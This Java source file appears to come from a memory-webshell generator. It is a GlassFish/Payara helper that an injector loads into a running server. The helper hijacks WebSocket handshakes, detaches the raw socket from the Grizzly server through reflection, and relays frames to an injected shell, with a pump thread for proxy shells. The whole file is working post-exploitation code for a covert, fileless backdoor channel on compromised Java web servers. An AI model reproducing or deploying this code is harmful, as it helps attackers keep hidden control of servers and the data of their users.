package com.reajason.javaweb.memshell.server.glassfish;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.ClosedChannelException;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

/**
 * GlassFish / Payara RawWebSocket helper 模板。
 * <p>
 * 生成期由 server 按 {@code <shellClassName>$RawWsHelper} 重命名并嵌入注入器；注入器先
 * defineClass 本类，再实例化 shell。shell 每次握手创建一个 helper 实例，调用
 * {@code helper.equals(new Object[]{request, response, this})} 后由本类接管连接：
 * 从 Catalina Request 取出 Grizzly 请求对象，脱离 Grizzly selector 后直接读写
 * {@link SocketChannel}，并反射调用 shell 的协议回调。
 * <p>
 * 覆盖两种 Grizzly 连接器实现：
 * <ul>
 *     <li>GlassFish 4~8 / Payara 4~7：Grizzly 2.x，连接由 FilterChainContext 持有；</li>
 *     <li>GlassFish 3：旧 Grizzly，Response 直接暴露 SelectionKey 与 SocketChannel。</li>
 * </ul>
 * 本类只依赖 JDK（目标 JDK 6），不引用任何 servlet / Grizzly 类型，javax 与 jakarta
 * 两种命名空间共用同一份代码。
 *
 * @author ReaJason
 */
public class GlassFishRawWsHelper implements Runnable {

    private static final String GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final int MAX_MESSAGE_SIZE = 50 * 1024 * 1024;
    private static final int OP_CONT = 0x0;
    private static final int OP_TEXT = 0x1;
    private static final int OP_BINARY = 0x2;
    private static final int OP_CLOSE = 0x8;
    private static final int OP_PING = 0x9;
    private static final int OP_PONG = 0xA;

    private static final int READ_POLL_TIMEOUT = 5000;
    private static final int IO_BUFFER_SIZE = 8192;
    private static final long WRITE_STALL_TIMEOUT = 30000;

    private static final int MODE_NONE = 0;
    private static final int MODE_GRIZZLY2 = 1;
    private static final int MODE_GRIZZLY1 = 2;

    private int wireMode = MODE_NONE;
    private final byte[] singleByte = new byte[1];
    /**
     * 已从连接读出但尚未消费的字节：初始为容器解析握手请求时多读的部分，之后复用为
     * 帧头/掩码读取的内部缓冲。按单字节读帧头时一次 select 读满，避免每字节唤醒一次 selector。
     */
    private byte[] pending;
    private int pendingIndex;
    private int pendingLength;

    private SocketChannel channel;
    private volatile Selector readSelector;
    private Object grizzlyResponse;

    private final Object writeLock = new Object();
    private volatile boolean closed;
    private Object shell;
    private Method onStart;
    private Method onReadBinary;
    private Method onReadText;
    private Method onDisconnect;
    private InputStream pumpInput;
    private Map attributes;
    private boolean hijacked;

    public GlassFishRawWsHelper() {
    }

    /**
     * 注入器到 helper 的唯一入口。返回 true 表示连接已被接管（101 已决定写或已写），
     * 调用方不能再回落到 FilterChain；返回 false 表示尚未接管，可安全 fallback。
     */
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Object[])) {
            return false;
        }
        Object[] args = (Object[]) obj;
        if (args.length != 3) {
            return false;
        }
        try {
            return connect(args[0], args[1], args[2]);
        } catch (Throwable ignored) {
            return hijacked;
        }
    }

    private boolean connect(Object request, Object response, Object shellObject) throws Exception {
        Object key = invoke(request, "getHeader", new Class[]{String.class}, new Object[]{"Sec-WebSocket-Key"});
        Object method = invoke(request, "getMethod", new Class[0], null);
        if (!(key instanceof String) || !"GET".equalsIgnoreCase(String.valueOf(method))) {
            return false;
        }
        String accept = acceptKey((String) key);
        if (accept == null) {
            return false;
        }

        Object grizzlyRequest = findGrizzlyRequest(request);
        if (grizzlyRequest == null || isSecure(grizzlyRequest)) {
            return false;
        }
        this.pending = extractLeftover(grizzlyRequest);
        this.pendingLength = pending == null ? 0 : pending.length;
        if (!takeOver(grizzlyRequest)) {
            return false;
        }
        this.shell = shellObject;
        this.onStart = findMethod(shellObject, "onStart", new Class[]{Object.class});
        this.onReadBinary = findMethod(shellObject, "onReadBinary", new Class[]{Object.class, byte[].class});
        this.onReadText = findMethod(shellObject, "onReadText", new Class[]{Object.class, String.class});
        this.onDisconnect = findMethod(shellObject, "onDisconnect", new Class[]{Object.class});
        this.hijacked = true;

        try {
            writeHandshake(accept);
        } catch (Throwable t) {
            closeConnection();
            return true;
        }
        invokeQuietly(onStart, shell, new Object[]{this});
        try {
            frameLoop();
        } catch (Throwable ignored) {
        } finally {
            invokeQuietly(onDisconnect, shell, new Object[]{this});
            closeConnection();
        }
        return true;
    }

    // ---------------------------------------------------------------- 连接接管

    private boolean takeOver(Object grizzlyRequest) {
        Object response = invoke(grizzlyRequest, "getResponse", new Class[0], null);
        if (response == null) {
            return false;
        }
        // InforSuite 等二开版本把 Grizzly 包名整体重命名，不能按 org.glassfish 前缀判断
        if (isGrizzly2Connection(grizzlyRequest)) {
            return takeOverGrizzly2(grizzlyRequest);
        }
        if (findMethod(response, "getChannel", new Class[0]) != null) {
            return takeOverGrizzly1(grizzlyRequest);
        }
        return false;
    }

    /**
     * Grizzly 2.x：Request.getContext() 返回 FilterChainContext，其 NIOConnection
     * 提供 detachSelectorRunner 与 SocketChannel。
     */
    private static boolean isGrizzly2Connection(Object grizzlyRequest) {
        Object context = invoke(grizzlyRequest, "getContext", new Class[0], null);
        Object connection = context == null ? null
                : invoke(context, "getConnection", new Class[0], null);
        return connection != null
                && findMethod(connection, "getChannel", new Class[0]) != null
                && findMethod(connection, "detachSelectorRunner", new Class[0]) != null;
    }

    /**
     * Grizzly 2.x（GlassFish 4~8、Payara 4~7）：Request -> FilterChainContext -> NIOConnection。
     * detachSelectorRunner 把连接从 selector 摘除，之后由本类自己的 selector 负责可读事件。
     */
    private boolean takeOverGrizzly2(Object grizzlyRequest) {
        Object response = invoke(grizzlyRequest, "getResponse", new Class[0], null);
        if (response == null || isTrue(invoke(response, "isSuspended", new Class[0], null))
                || isTrue(invoke(response, "isCommitted", new Class[0], null))) {
            return false;
        }
        Object context = invoke(grizzlyRequest, "getContext", new Class[0], null);
        Object connection = context == null ? null
                : invoke(context, "getConnection", new Class[0], null);
        Object channelObject = connection == null ? null
                : invoke(connection, "getChannel", new Class[0], null);
        if (!(channelObject instanceof SocketChannel)) {
            return false;
        }
        Object selectionKey = invoke(connection, "getSelectionKey", new Class[0], null);
        try {
            invoke(connection, "detachSelectorRunner", new Class[0], null);
        } catch (Throwable ignored) {
            // detach 先把字段置空再注销，失败时 key 可能仍在 selector 上，下面再取消一次
        }
        cancelKey(selectionKey);
        this.channel = (SocketChannel) channelObject;
        this.grizzlyResponse = response;
        this.wireMode = MODE_GRIZZLY2;
        suspendResponse(response);
        return true;
    }

    /**
     * 旧 Grizzly（GlassFish 3）：coyote Response 直接持有 SelectionKey 和 SocketChannel，
     * 没有 detach API，取消 key 即可阻止 selector 继续读取。
     */
    private boolean takeOverGrizzly1(Object grizzlyRequest) {
        Object response = invoke(grizzlyRequest, "getResponse", new Class[0], null);
        if (response == null || isTrue(invoke(response, "isSuspended", new Class[0], null))) {
            return false;
        }
        Object channelObject = invoke(response, "getChannel", new Class[0], null);
        if (!(channelObject instanceof SocketChannel)) {
            return false;
        }
        Object selectionKey = invoke(response, "getSelectionKey", new Class[0], null);
        if (!isTrue(invoke(response, "isSuspended", new Class[0], null))) {
            try {
                // 旧 Grizzly 的 suspend 还会把响应挂到 SelectionKey 上并设置当前线程标记，
                // ProcessorTask 之后的 postResponse/postProcess 会因此跳过收尾。
                invoke(response, "suspend", new Class[0], null);
            } catch (Throwable ignored) {
                return false;
            }
        }
        cancelKey(selectionKey);
        detachOldSuspend(grizzlyRequest, selectionKey);
        this.channel = (SocketChannel) channelObject;
        this.grizzlyResponse = response;
        this.wireMode = MODE_GRIZZLY1;
        return true;
    }

    /**
     * 旧 Grizzly 把 suspend 状态挂在 SelectionKey 的 ThreadAttachment 上；key 取消后
     * 主动 detach，避免线程池复用的 attachment 继续引用 response 与 webapp 类加载器。
     */
    private static void detachOldSuspend(Object grizzlyRequest, Object selectionKey) {
        if (!(selectionKey instanceof SelectionKey)) {
            return;
        }
        // SuspendResponseUtils 与 Request 同包；标准 Grizzly 与二开重命名都适用
        String className = grizzlyRequest.getClass().getName();
        int dot = className.lastIndexOf('.');
        String localName = dot < 0 ? className : className.substring(0, dot) + ".SuspendResponseUtils";
        String[] candidates = new String[]{localName, "com.sun.grizzly.tcp.SuspendResponseUtils"};
        for (int i = 0; i < candidates.length; i++) {
            try {
                Class<?> utils = Class.forName(candidates[i], true,
                        grizzlyRequest.getClass().getClassLoader());
                utils.getMethod("detach", new Class[]{SelectionKey.class})
                        .invoke(null, new Object[]{selectionKey});
                return;
            } catch (Throwable ignored) {
            }
        }
    }

    private void suspendResponse(Object response) {
        try {
            invoke(response, "suspend", new Class[0], null);
        } catch (Throwable ignored) {
            // 已经 suspend 或响应已提交；调用方已接管连接，继续跑帧循环
        }
    }

    private static void cancelKey(Object selectionKey) {
        if (selectionKey instanceof SelectionKey) {
            try {
                ((SelectionKey) selectionKey).cancel();
            } catch (Throwable ignored) {
            }
        }
    }

    private static boolean isSecure(Object grizzlyRequest) {
        Object secure = invoke(grizzlyRequest, "isSecure", new Class[0], null);
        if (secure instanceof Boolean) {
            return ((Boolean) secure).booleanValue();
        }
        Object scheme = invoke(grizzlyRequest, "scheme", new Class[0], null);
        return scheme != null && "https".equalsIgnoreCase(String.valueOf(scheme));
    }

    // ---------------------------------------------------------------- 原始字节读写

    private int readWire(byte[] buffer, int offset, int length) throws IOException {
        if (length <= 0) {
            return 0;
        }
        // 帧头和掩码按单字节读取；一次 select 读满内部缓冲后再逐字节消费，
        // 否则 2~10 字节的帧头会触发同样次数的 selector 唤醒和 read 系统调用。
        // payload 等大块读取直接落到调用方缓冲区，不经过这次中转。
        if (pendingIndex >= pendingLength && length == 1) {
            if (pending == null || pending.length < IO_BUFFER_SIZE) {
                pending = new byte[IO_BUFFER_SIZE];
            }
            int count = readWireDirect(pending, 0, pending.length);
            if (count <= 0) {
                return count;
            }
            pendingLength = count;
            pendingIndex = 0;
        }
        if (pendingIndex < pendingLength) {
            int count = pendingLength - pendingIndex;
            if (count > length) {
                count = length;
            }
            System.arraycopy(pending, pendingIndex, buffer, offset, count);
            pendingIndex += count;
            return count;
        }
        return readWireDirect(buffer, offset, length);
    }

    private int readWireDirect(byte[] buffer, int offset, int length) throws IOException {
        while (!closed) {
            Selector selector = readSelector();
            int selected;
            try {
                selected = selector.select(READ_POLL_TIMEOUT);
            } catch (Throwable t) {
                if (closed) {
                    return -1;
                }
                throw new IOException("select failed: " + t);
            }
            if (closed) {
                return -1;
            }
            if (selected <= 0) {
                continue;
            }
            selector.selectedKeys().clear();
            try {
                int count = channel.read(ByteBuffer.wrap(buffer, offset, length));
                if (count != 0) {
                    return count;
                }
            } catch (ClosedChannelException e) {
                return -1;
            } catch (Throwable t) {
                if (closed) {
                    return -1;
                }
                if (t instanceof IOException) {
                    throw (IOException) t;
                }
                throw new IOException("read failed: " + t);
            }
        }
        return -1;
    }

    private int readWireByte() throws IOException {
        while (!closed) {
            int count = readWire(singleByte, 0, 1);
            if (count > 0) {
                return singleByte[0] & 0xFF;
            }
            if (count < 0) {
                return -1;
            }
        }
        return -1;
    }

    private void readFully(byte[] buffer, int offset, int length) throws IOException {
        int read = 0;
        while (read < length) {
            int count = readWire(buffer, offset + read, length - read);
            if (count < 0) {
                throw new IOException("unexpected EOF");
            }
            if (count == 0) {
                if (closed) {
                    throw new IOException("connection closed");
                }
                continue;
            }
            read += count;
        }
    }

    /**
     * 按声明长度立即分配整段 payload 会被伪造的超大帧头耗尽内存；分块读入并就地解掩码，
     * 实际到达多少才占用多少。
     */
    private byte[] readMaskedPayload(long length, byte[] mask) throws IOException {
        int total = (int) length;
        if (total <= 0) {
            return new byte[0];
        }
        int chunkSize = Math.min(total, IO_BUFFER_SIZE);
        ByteArrayOutputStream out = new ByteArrayOutputStream(chunkSize);
        byte[] chunk = new byte[chunkSize];
        int received = 0;
        while (received < total) {
            int n = Math.min(chunkSize, total - received);
            readFully(chunk, 0, n);
            for (int i = 0; i < n; i++) {
                chunk[i] = (byte) (chunk[i] ^ mask[(received + i) % 4]);
            }
            out.write(chunk, 0, n);
            received += n;
        }
        return out.toByteArray();
    }

    private Selector readSelector() throws IOException {
        Selector selector = readSelector;
        if (selector != null) {
            return selector;
        }
        selector = Selector.open();
        try {
            channel.register(selector, SelectionKey.OP_READ);
        } catch (Throwable t) {
            selector.close();
            if (t instanceof IOException) {
                throw (IOException) t;
            }
            throw new IOException("register failed: " + t);
        }
        readSelector = selector;
        return selector;
    }

    private void writeWire(byte[] data, int offset, int length) throws IOException {
        ByteBuffer buffer = ByteBuffer.wrap(data, offset, length);
        long stallStart = 0;
        while (buffer.hasRemaining()) {
            if (closed) {
                throw new IOException("connection closed");
            }
            int count;
            try {
                count = channel.write(buffer);
            } catch (ClosedChannelException e) {
                throw new IOException("connection closed");
            }
            if (count < 0) {
                throw new IOException("connection closed");
            }
            if (count > 0) {
                stallStart = 0;
                continue;
            }
            // 对端停止读取时非阻塞写持续返回 0；整个过程持有 writeLock，无限空转会把
            // 帧线程排队的 pong/close 帧永远堵在锁后，停滞超过死线就抛异常让上层关闭连接
            long now = System.currentTimeMillis();
            if (stallStart == 0) {
                stallStart = now;
            } else if (now - stallStart > WRITE_STALL_TIMEOUT) {
                throw new IOException("write stalled");
            }
            try {
                Thread.sleep(1);
            } catch (InterruptedException e) {
                throw new IOException("write interrupted");
            }
        }
    }

    private void closeConnection() {
        if (closed) {
            return;
        }
        closed = true;
        Selector selector = readSelector;
        if (selector != null) {
            try {
                selector.wakeup();
            } catch (Throwable ignored) {
            }
        }
        try {
            if (channel != null) {
                channel.close();
            }
        } catch (Throwable ignored) {
        }
        try {
            if (selector != null) {
                selector.close();
            }
        } catch (Throwable ignored) {
        }
        this.channel = null;
        this.grizzlyResponse = null;
    }

    // ---------------------------------------------------------------- 协议

    private void writeHandshake(String accept) throws IOException {
        String responseText = "HTTP/1.1 101 Switching Protocols\r\n"
                + "Upgrade: websocket\r\n"
                + "Connection: Upgrade\r\n"
                + "X-Accel-Buffering: no\r\n"
                + "Sec-WebSocket-Accept: " + accept + "\r\n"
                + "\r\n";
        byte[] data = responseText.getBytes(UTF8);
        synchronized (writeLock) {
            writeWire(data, 0, data.length);
        }
    }

    private void frameLoop() {
        ByteArrayOutputStream fragments = null;
        int fragmentOpcode = -1;
        try {
            while (!closed) {
                int b1 = readWireByte();
                if (b1 == -1) {
                    break;
                }
                boolean fin = (b1 & 0x80) != 0;
                int opcode = b1 & 0x0F;
                if ((b1 & 0x70) != 0) {
                    closeWith(1002, "unexpected reserved bits");
                    return;
                }

                int b2 = readWireByte();
                if (b2 == -1) {
                    break;
                }
                boolean masked = (b2 & 0x80) != 0;
                long length = b2 & 0x7F;
                if (length == 126) {
                    int e1 = readWireByte();
                    int e2 = readWireByte();
                    if (e1 < 0 || e2 < 0) {
                        return;
                    }
                    length = ((long) e1 << 8) | e2;
                } else if (length == 127) {
                    length = 0;
                    for (int i = 0; i < 8; i++) {
                        int e = readWireByte();
                        if (e < 0) {
                            return;
                        }
                        length = (length << 8) | e;
                    }
                }
                if (length < 0 || length > MAX_MESSAGE_SIZE) {
                    closeWith(1009, "message too big");
                    return;
                }
                if (!masked) {
                    closeWith(1002, "client frame must be masked");
                    return;
                }
                if (opcode >= 0x8 && (!fin || length > 125)) {
                    closeWith(1002, "invalid control frame");
                    return;
                }

                byte[] mask = new byte[4];
                readFully(mask, 0, mask.length);
                byte[] message = readMaskedPayload(length, mask);

                if (opcode == OP_CLOSE) {
                    if (message.length == 1) {
                        // RFC 6455 §5.5：Close 体只能是空或 2 字节状态码，1 字节按协议错误处理
                        closeWith(1002, "invalid close frame");
                        return;
                    }
                    sendFrame(OP_CLOSE, message);
                    closeConnection();
                    return;
                }
                if (opcode == OP_PING) {
                    sendFrame(OP_PONG, message);
                    continue;
                }
                if (opcode == OP_PONG) {
                    continue;
                }
                if (opcode == OP_CONT) {
                    if (fragments == null) {
                        closeWith(1002, "unexpected continuation");
                        return;
                    }
                    fragments.write(message);
                    if (fragments.size() > MAX_MESSAGE_SIZE) {
                        closeWith(1009, "message too big");
                        return;
                    }
                    if (fin) {
                        dispatch(fragmentOpcode, fragments.toByteArray());
                        fragments = null;
                        fragmentOpcode = -1;
                    }
                    continue;
                }
                if (opcode == OP_TEXT || opcode == OP_BINARY) {
                    if (fragments != null) {
                        closeWith(1002, "expected continuation");
                        return;
                    }
                    if (fin) {
                        dispatch(opcode, message);
                    } else {
                        fragmentOpcode = opcode;
                        fragments = new ByteArrayOutputStream();
                        fragments.write(message);
                    }
                    continue;
                }
                closeWith(1002, "unknown opcode");
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    private void dispatch(int opcode, byte[] message) {
        if (opcode == OP_TEXT) {
            invokeQuietly(onReadText, shell, new Object[]{this, new String(message, UTF8)});
        } else {
            invokeQuietly(onReadBinary, shell, new Object[]{this, message});
        }
    }

    public void sendText(String text) {
        sendFrame(OP_TEXT, text.getBytes(UTF8));
    }

    public void sendBinary(byte[] data) {
        sendFrame(OP_BINARY, data);
    }

    /**
     * 供壳主动结束会话（如代理建连失败）：发送 Close 帧并释放底层连接。
     */
    public void close() {
        closeWith(1000, null);
    }

    private void sendFrame(int opcode, byte[] data) {
        synchronized (writeLock) {
            if (closed) {
                return;
            }
            try {
                int length = data.length;
                byte[] header;
                if (length <= 125) {
                    header = new byte[]{0, (byte) length};
                } else if (length <= 0xFFFF) {
                    header = new byte[]{0, 126, (byte) ((length >>> 8) & 0xFF), (byte) (length & 0xFF)};
                } else {
                    header = new byte[10];
                    header[1] = 127;
                    for (int i = 0; i < 8; i++) {
                        header[9 - i] = (byte) (((long) length >>> (8 * i)) & 0xFF);
                    }
                }
                header[0] = (byte) (0x80 | opcode);
                writeWire(header, 0, header.length);
                writeWire(data, 0, data.length);
            } catch (Throwable t) {
                closeConnection();
            }
        }
    }

    private void closeWith(int code, String reason) {
        byte[] reasonBytes = reason == null ? new byte[0] : reason.getBytes(UTF8);
        byte[] data = new byte[2 + reasonBytes.length];
        data[0] = (byte) ((code >>> 8) & 0xFF);
        data[1] = (byte) (code & 0xFF);
        System.arraycopy(reasonBytes, 0, data, 2, reasonBytes.length);
        sendFrame(OP_CLOSE, data);
        closeConnection();
    }

    public Object getAttribute(String name) {
        Map map = attributes;
        return map == null ? null : map.get(name);
    }

    public void setAttribute(String name, Object value) {
        if (attributes == null) {
            attributes = new HashMap();
        }
        if (value == null) {
            attributes.remove(name);
        } else {
            attributes.put(name, value);
        }
    }

    /**
     * 为 Proxy 壳提供目标端到客户端的异步泵送。帧循环占用当前请求线程，
     * 与 Tomcat helper 一致；本类的 Runnable 身份留给泵线程。
     */
    public void startPump(InputStream targetInput) {
        if (targetInput == null) {
            return;
        }
        this.pumpInput = targetInput;
        Thread thread = new Thread(this, "rawws-pump");
        thread.setDaemon(true);
        thread.setContextClassLoader(getClass().getClassLoader());
        thread.start();
    }

    @Override
    public void run() {
        InputStream targetInput = pumpInput;
        if (targetInput == null) {
            return;
        }
        byte[] buffer = new byte[8192];
        try {
            while (!closed) {
                int count = targetInput.read(buffer);
                if (count == -1) {
                    break;
                }
                if (count > 0) {
                    byte[] data = new byte[count];
                    System.arraycopy(buffer, 0, data, 0, count);
                    sendBinary(data);
                }
            }
        } catch (Throwable ignored) {
        }
        closeWith(1000, null);
    }

    // ---------------------------------------------------------------- 反射工具

    /**
     * 从 Filter 拿到的 ServletRequest 沿包装链找到 Grizzly 请求对象。
     * RequestFacade 在 GF3/4 叫 request、GF7+ 叫 catalinaConnectorReqest；
     * Catalina Request 在 GF3~6 叫 coyoteRequest、GF7+ 叫 grizzlyRequest。
     * InforSuite 等二开版本会重命名 Grizzly 包名，因此类名匹配不到时按方法结构识别。
     */
    private static Object findGrizzlyRequest(Object request) {
        Object current = request;
        for (int depth = 0; current != null && depth < 8; depth++) {
            if (isGrizzlyRequest(current)) {
                return current;
            }
            String className = current.getClass().getName();
            Object next = getField(current, "catalinaConnectorReqest");
            if (next == null) {
                next = getField(current, "coyoteRequest");
            }
            if (next == null) {
                next = getField(current, "grizzlyRequest");
            }
            if (next == null) {
                next = getField(current, "request");
            }
            if (next == null) {
                next = invoke(current, "getCoyoteRequest", new Class[0], null);
            }
            if (next == null) {
                next = invoke(current, "getGrizzlyRequest", new Class[0], null);
            }
            if (next == null && className.indexOf("org.apache.catalina") < 0) {
                next = invoke(current, "getRequest", new Class[0], null);
            }
            if (next == null) {
                return null;
            }
            current = next;
        }
        return null;
    }

    private static boolean isGrizzlyRequest(Object candidate) {
        if (candidate == null) {
            return false;
        }
        String className = candidate.getClass().getName();
        if (className.startsWith("org.glassfish.grizzly.http.server.Request")
                || className.startsWith("com.sun.grizzly.tcp.Request")) {
            return true;
        }
        if (findMethod(candidate, "getResponse", new Class[0]) == null
                || findMethod(candidate, "getInputBuffer", new Class[0]) == null) {
            return false;
        }
        Object response = invoke(candidate, "getResponse", new Class[0], null);
        return response != null
                && (findMethod(candidate, "getContext", new Class[0]) != null
                || findMethod(response, "getChannel", new Class[0]) != null);
    }

    /**
     * 握手请求解析后可能把客户端紧随其后的帧读进容器缓冲区。
     * Grizzly 2 的 InputBuffer 暴露当前内容 Buffer；旧 Grizzly 用 buf/pos/lastValid。
     */
    private static byte[] extractLeftover(Object grizzlyRequest) {
        Object inputBuffer = invoke(grizzlyRequest, "getInputBuffer", new Class[0], null);
        if (inputBuffer == null) {
            return null;
        }
        try {
            Object buffer = invoke(inputBuffer, "getBuffer", new Class[0], null);
            if (buffer != null) {
                Object remaining = invoke(buffer, "remaining", new Class[0], null);
                if (remaining instanceof Integer && ((Integer) remaining).intValue() > 0) {
                    int size = ((Integer) remaining).intValue();
                    byte[] data = new byte[size];
                    Method get = buffer.getClass().getMethod("get",
                            new Class[]{byte[].class, int.class, int.class});
                    get.invoke(buffer, new Object[]{data, Integer.valueOf(0), Integer.valueOf(size)});
                    return data;
                }
            }
        } catch (Throwable ignored) {
            // 旧 Grizzly 的 InputBuffer 没有 getBuffer，走下面的字段路径
        }
        Object buf = getField(inputBuffer, "buf");
        Object pos = getField(inputBuffer, "pos");
        Object lastValid = getField(inputBuffer, "lastValid");
        if (buf instanceof byte[] && pos instanceof Integer && lastValid instanceof Integer) {
            int start = ((Integer) pos).intValue();
            int end = ((Integer) lastValid).intValue();
            byte[] bytes = (byte[]) buf;
            if (start >= 0 && end > start && end <= bytes.length) {
                byte[] data = new byte[end - start];
                System.arraycopy(bytes, start, data, 0, data.length);
                return data;
            }
        }
        return null;
    }

    private static boolean isTrue(Object value) {
        return value instanceof Boolean && ((Boolean) value).booleanValue();
    }

    private static Object getField(Object target, String name) {
        if (target == null) {
            return null;
        }
        Class<?> clazz = target.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            } catch (Throwable ignored) {
                return null;
            }
        }
        return null;
    }

    private static Object invoke(Object target, String name, Class[] parameterTypes, Object[] args) {
        if (target == null) {
            return null;
        }
        try {
            Method method = target.getClass().getMethod(name, parameterTypes);
            return method.invoke(target, args);
        } catch (InvocationTargetException e) {
            return null;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static Method findMethod(Object target, String name, Class[] parameterTypes) {
        try {
            return target.getClass().getMethod(name, parameterTypes);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void invokeQuietly(Method method, Object target, Object[] args) {
        if (method == null) {
            return;
        }
        try {
            method.invoke(target, args);
        } catch (Throwable ignored) {
        }
    }

    private static String acceptKey(String key) {
        try {
            MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
            return base64Encode(sha1.digest((key + GUID).getBytes(UTF8)));
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String base64Encode(byte[] data) {
        try {
            Class<?> base64Class = Class.forName("java.util.Base64");
            Object encoder = base64Class.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class)
                    .invoke(encoder, new Object[]{data});
        } catch (Throwable ignored) {
        }
        try {
            Class<?> encoderClass = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = encoderClass.newInstance();
            String value = (String) encoderClass.getMethod("encode", byte[].class)
                    .invoke(encoder, new Object[]{data});
            return value.replace("\n", "").replace("\r", "");
        } catch (Throwable ignored) {
            return null;
        }
    }
}
